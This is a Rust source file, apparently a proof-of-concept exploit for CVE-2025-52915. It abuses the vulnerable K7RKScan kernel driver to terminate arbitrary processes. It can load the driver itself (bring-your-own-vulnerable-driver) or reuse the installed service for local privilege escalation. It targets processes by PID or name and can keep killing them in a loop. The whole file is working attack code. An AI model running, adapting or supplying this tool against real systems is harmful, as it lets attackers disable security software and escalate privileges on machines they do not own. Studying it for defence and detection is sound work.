use clap::{Arg, Command};
use std::ffi::CStr;
use std::{mem, thread, time::Duration, path::Path};
use std::ptr::null_mut;
use winapi::um::{
    fileapi::{CreateFileW, OPEN_EXISTING},
    handleapi::{CloseHandle, INVALID_HANDLE_VALUE},
    ioapiset::DeviceIoControl,
    processenv::GetCurrentDirectoryW,
    tlhelp32::{CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS},
    winsvc::{CloseServiceHandle, CreateServiceW, OpenSCManagerW, OpenServiceW, StartServiceW,
             SC_MANAGER_CREATE_SERVICE, SERVICE_ALL_ACCESS, SERVICE_QUERY_STATUS, QueryServiceStatus, 
             SERVICE_STATUS, SERVICE_RUNNING},
};
use std::os::windows::ffi::OsStrExt;
use winapi::um::winnt::{SERVICE_AUTO_START, SERVICE_KERNEL_DRIVER, SERVICE_ERROR_NORMAL};
use winapi::um::errhandlingapi::GetLastError;

const DRIVER_NAME: &str = "K7RKScan";
const DRIVER_DEVICE: &str = "\\\\.\\DosK7RKScnDrv";
const IOCTL_KILL: u32 = 0x222018;
const GENERIC_WRITE: u32 = 0x40000000;

#[derive(Debug)]
struct Config {
    mode: bool, // true = BYOVD, false = LPE
    target_pid: Option<u32>,
    target_names: Vec<String>,
    looper: bool,
    driver_path: Option<String>,
}

struct K7Terminator {
    config: Config,
}

impl K7Terminator {
    fn new(config: Config) -> Self { Self { config } }

    fn to_wstring(s: &str) -> Vec<u16> {
        std::ffi::OsStr::new(s).encode_wide().chain(Some(0)).collect()
    }

    fn is_service_running(&self) -> bool {
        unsafe {
            let sc_manager = OpenSCManagerW(null_mut(), null_mut(), 0x0001);
            if sc_manager.is_null() { return false; }
            
            let service = OpenServiceW(sc_manager, Self::to_wstring(DRIVER_NAME).as_ptr(), SERVICE_QUERY_STATUS);
            if service.is_null() {
                CloseServiceHandle(sc_manager);
                return false;
            }
            
            let mut status: SERVICE_STATUS = mem::zeroed();
            let result = QueryServiceStatus(service, &mut status) != 0 && status.dwCurrentState == SERVICE_RUNNING;
            
            CloseServiceHandle(service);
            CloseServiceHandle(sc_manager);
            result
        }
    }

    fn load_driver(&self) -> bool {
        let driver_path = if let Some(path) = &self.config.driver_path {
            if Path::new(path).is_absolute() {
                path.clone()
            } else {
                unsafe {
                    let mut buf = vec![0u16; 260];
                    let len = GetCurrentDirectoryW(buf.len() as u32, buf.as_mut_ptr());
                    if len == 0 { return false; }
                    buf.truncate(len as usize);
                    format!("{}\\{}", String::from_utf16_lossy(&buf), path)
                }
            }
        } else {
            unsafe {
                let mut buf = vec![0u16; 260];
                let len = GetCurrentDirectoryW(buf.len() as u32, buf.as_mut_ptr());
                if len == 0 { return false; }
                buf.truncate(len as usize);
                format!("{}\\{}.sys", String::from_utf16_lossy(&buf), DRIVER_NAME)
            }
        };

        if !Path::new(&driver_path).exists() {
            eprintln!("[-] Driver not found: {}", driver_path);
            return false;
        }

        unsafe {
            let sc_manager = OpenSCManagerW(null_mut(), null_mut(), SC_MANAGER_CREATE_SERVICE);
            if sc_manager.is_null() { return false; }
            
            let service_name = Self::to_wstring(DRIVER_NAME);
            let mut service = OpenServiceW(sc_manager, service_name.as_ptr(), SERVICE_ALL_ACCESS);
            
            if service.is_null() {
                println!("[+] Creating service: {}", driver_path);
                service = CreateServiceW(
                    sc_manager, service_name.as_ptr(), service_name.as_ptr(),
                    SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START,
                    SERVICE_ERROR_NORMAL, Self::to_wstring(&driver_path).as_ptr(),
                    null_mut(), null_mut(), null_mut(), null_mut(), null_mut(),
                );
                if service.is_null() {
                    CloseServiceHandle(sc_manager);
                    return false;
                }
            }
            
            let result = StartServiceW(service, 0, null_mut()) != 0;
            CloseServiceHandle(service);
            CloseServiceHandle(sc_manager);
            
            if result { println!("[+] Driver loaded"); }
            true
        }
    }

    fn get_pids_by_name(&self, name: &str) -> Vec<u32> {
        let mut pids = Vec::new();
        unsafe {
            let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if snap == INVALID_HANDLE_VALUE { return pids; }
            
            let mut entry: PROCESSENTRY32 = mem::zeroed();
            entry.dwSize = mem::size_of::<PROCESSENTRY32>() as u32;
            
            if Process32First(snap, &mut entry) != 0 {
                loop {
                    let current = CStr::from_ptr(entry.szExeFile.as_ptr()).to_string_lossy();
                    if current.to_lowercase() == name.to_lowercase() {
                        pids.push(entry.th32ProcessID);
                    }
                    if Process32Next(snap, &mut entry) == 0 { break; }
                }
            }
            CloseHandle(snap);
        }
        pids
    }

    fn kill_process(&self, pid: u32) -> bool {
        if self.config.mode {
            // BYOVD mode - driver should be ready immediately after loading
            unsafe {
                let handle = CreateFileW(
                    Self::to_wstring(DRIVER_DEVICE).as_ptr(), GENERIC_WRITE, 0,
                    null_mut(), OPEN_EXISTING, 0, null_mut(),
                );
                
                if handle == INVALID_HANDLE_VALUE { 
                    let error = GetLastError();
                    println!("[-] Failed to open device handle: {} (Error: 0x{:x})", DRIVER_DEVICE, error);
                    return false; 
                }
                
                let mut out = 0u32;
                let mut bytes = 0u32;
                let success = DeviceIoControl(
                    handle, IOCTL_KILL, &pid as *const _ as *mut _, 4,
                    &mut out as *mut _ as *mut _, 4, &mut bytes, null_mut(),
                );
                
                CloseHandle(handle);
                
                if success != 0 {
                    true
                } else {
                    let error = GetLastError();
                    println!("[-] IOCTL failed for PID: {} (Error: 0x{:x})", pid, error);
                    false
                }
            }
        } else {
            // LPE mode - retry until device is ready (timing issue with service startup)
            let mut first_attempt = true;
            
            loop {
                unsafe {
                    let handle = CreateFileW(
                        Self::to_wstring(DRIVER_DEVICE).as_ptr(), GENERIC_WRITE, 0,
                        null_mut(), OPEN_EXISTING, 0, null_mut(),
                    );
                    
                    if handle == INVALID_HANDLE_VALUE {
                        if first_attempt {
                            println!("[*] Device not ready, retrying...");
                            first_attempt = false;
                        }
                        thread::sleep(Duration::from_millis(100));
                        continue;
                    }
                    
                    let mut out = 0u32;
                    let mut bytes = 0u32;
                    let success = DeviceIoControl(
                        handle, IOCTL_KILL, &pid as *const _ as *mut _, 4,
                        &mut out as *mut _ as *mut _, 4, &mut bytes, null_mut(),
                    );
                    
                    CloseHandle(handle);
                    
                    if success != 0 {
                        return true;
                    } else {
                        // IOCTL failed, could be timing or permission issue
                        thread::sleep(Duration::from_millis(100));
                    }
                }
            }
        }
    }

    fn execute(&self) {
        if self.config.mode {
            if !self.load_driver() {
                eprintln!("[-] Failed to load driver");
                return;
            }
            thread::sleep(Duration::from_millis(500));
        } else {
            println!("[*] Waiting for {} service...", DRIVER_NAME);
            while !self.is_service_running() {
                thread::sleep(Duration::from_secs(1));
            }
            println!("[+] Service detected");
        }

        if let Some(pid) = self.config.target_pid {
            self.terminate_pid(pid);
        } else {
            for name in &self.config.target_names {
                self.terminate_name(name);
            }
        }
    }

    fn terminate_pid(&self, pid: u32) {
        loop {
            println!("[*] Targeting PID: {}", pid);
            if self.kill_process(pid) {
                println!("[+] Terminated PID: {}", pid);
                if !self.config.looper { break; }
            } else {
                println!("[-] Failed PID: {}", pid);
            }
            if self.config.looper {
                thread::sleep(Duration::from_millis(500));
            } else { break; }
        }
    }

    fn terminate_name(&self, name: &str) {
        loop {
            let pids = self.get_pids_by_name(name);
            if pids.is_empty() {
                println!("[!] No processes: {}", name);
                if !self.config.looper { break; }
                thread::sleep(Duration::from_millis(1000));
                continue;
            }
            
            for pid in &pids {
                println!("[*] Targeting {} PID: {}", name, pid);
                if self.kill_process(*pid) {
                    println!("[+] Terminated {} ({})", name, pid);
                } else {
                    println!("[-] Failed {} ({})", name, pid);
                }
            }
            
            if !self.config.looper { break; }
            thread::sleep(Duration::from_millis(500));
        }
    }
}

fn main() {
    let matches = Command::new("K7Terminator")
        .version("1.0")
        .author("BlackSnufkin")
        .about("K7RKScan Process Terminator - LPE + BYOVD (CVE-2025-52915) PoC")
        .after_help("EXAMPLES:\n  K7Terminator.exe -m lpe -n notepad.exe\n  K7Terminator.exe -m byovd -p 1234")
        .arg(Arg::new("mode")
            .short('m')
            .long("mode")
            .help("lpe (wait for service) or byovd (load driver)")
            .required(true)
            .value_parser(["lpe", "byovd"]))
        .arg(Arg::new("pid")
            .short('p')
            .long("pid")
            .help("Target process ID")
            .value_parser(clap::value_parser!(u32)))
        .arg(Arg::new("name")
            .short('n')
            .long("name")
            .help("Target process name(s)")
            .action(clap::ArgAction::Append))
        .arg(Arg::new("looper")
            .short('l')
            .long("looper")
            .help("Keep targeting processes")
            .action(clap::ArgAction::SetTrue))
        .arg(Arg::new("driver")
            .short('d')
            .long("driver")
            .help("Driver path (default: ./K7RKScan.sys)"))
        .get_matches();



    let mode = matches.get_one::<String>("mode").unwrap() == "byovd";
    let target_pid = matches.get_one::<u32>("pid").copied();
    let target_names: Vec<String> = matches.get_many::<String>("name").unwrap_or_default().cloned().collect();
    let looper = matches.get_flag("looper");
    let driver_path = matches.get_one::<String>("driver").cloned();

    if target_pid.is_none() && target_names.is_empty() {
        eprintln!("[-] Must specify --pid or --name");
        std::process::exit(1);
    }

    let config = Config { mode, target_pid, target_names, looper, driver_path };
    println!("[*] Mode: {}", if mode { "BYOVD" } else { "LPE" });
    
    K7Terminator::new(config).execute();
}